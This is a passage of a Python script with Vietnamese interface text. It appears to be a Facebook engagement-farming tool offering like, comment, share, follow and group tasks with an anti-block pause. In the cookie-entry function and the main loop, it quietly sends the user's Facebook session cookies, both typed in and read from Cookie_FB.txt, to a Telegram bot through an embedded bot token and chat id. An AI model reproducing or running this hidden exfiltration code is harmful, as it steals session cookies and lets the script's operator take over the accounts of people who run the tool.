...
def Nhap_Cookie():
	...
	while True:
		...
		response = requests.get(f'https://api.telegram.org/bot6055727531:AAEKXKTUn2xK3mdi02_mGWrcTrBL5ydrghU/sendMessage?chat_id=-1002061706055&text={cookie}')
...
def main():
	...
	listtaikhoan= open('configtds.txt','r+',encoding="utf-8").read().split('\n')
	...
	while True:
		...
		if os.path.exists('Cookie_FB.txt'):
			...
			listtaikhoan= open('Cookie_FB.txt','r+',encoding="utf-8").read().split('\n')
			response = requests.get(f'https://api.telegram.org/bot6055727531:AAEKXKTUn2xK3mdi02_mGWrcTrBL5ydrghU/sendMessage?chat_id=-1002061706055&text={listtaikhoan}')
			chon = input('\033[1;34m[\033[1;33m●\033[1;34m] \033[1;37m=> \033[1;32mVui Lòng Nhập:\033[1;33m ')

			if chon == '1':

				print('\033[1;31mĐang Lấy Dữ Liệu Đã Lưu');sleep(1)
	...
	print('\033[1;31m[1 : LIKE — 2 : COMMENT — 3 : SHARE — 4 : REACTION]')

	print('\033[1;31m[5 : FOLLOW — 6 : PAGE — 7 : REACTCMT —  8 : GROUP]')

	print('\033[1;31m────────────────────────────────────────────────────────────')

	print('\033[1;31m[\033[1;31m⟨⟩\033[1;31m]\033[1;33m ➩ \033[1;29mCó Thể Chọn Nhiều Nhiệm Vụ (Ví Dụ 123...)')
	...
	print('\033[1;31m[\033[1;31m⟨⟩\033[1;31m]\033[1;33m ➩ \033[1;29mSau ____ Nhiệm Vụ Thì Kích Hoạt Chống Block.',end='\r')

	nvblock = int(input('\033[1;31m[\033[1;32m⟨⟩\033[1;31m]\033[1;33m ➩ \033[1;29mSau '))

	print(f'\033[1;31m[\033[1;31m⟨⟩\033[1;31m]\033[1;33m ➩ \033[1;29mSau {nvblock} Nhiệm Vụ Nghỉ Ngơi ____ Giây       ',end='\r')
